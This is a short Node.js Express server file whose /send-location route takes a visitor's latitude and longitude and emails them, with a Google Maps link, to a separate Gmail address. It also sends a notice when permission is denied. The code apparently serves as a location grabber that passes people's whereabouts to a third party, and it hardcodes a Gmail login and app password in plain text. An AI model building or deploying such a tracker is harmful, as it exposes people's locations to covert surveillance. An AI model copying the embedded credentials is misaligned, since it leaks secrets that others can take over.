const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

app.use(cors());
app.use(express.json());

// Gmail transporter (Render safe + IPv4 fix)
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: "moneyheist1970@gmail.com",   // Gmail
    pass: "Xy7!Qp@92Lm#T4Rs"    // App Password
  },
  tls: {
    family: 4   // Fix ENETUNREACH error
  }
});

// Test route
app.get("/", (req, res) => {
  res.send("Backend is running");
});

// Location API
app.post("/send-location", async (req, res) => {
  try {
    let text = "";

    if (req.body.status === "granted") {
      const { latitude, longitude } = req.body;

      text = `
Location Granted

Latitude: ${latitude}
Longitude: ${longitude}

Google Map:
https://www.google.com/maps?q=${latitude},${longitude}
`;
    } else {
      text = "User denied location permission.";
    }

    await transporter.sendMail({
      from: "moneyheist1970@gmail.com",
      to: "canikissu182@gmail.com",
      subject: "Har Har Mahadev",
      text: text
    });

    res.status(200).json({ message: "Email sent successfully" });

  } catch (error) {
    console.log("Email error:", error);
    res.status(500).json({ message: "Email failed", error: error.message });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log("Server running on port", PORT));
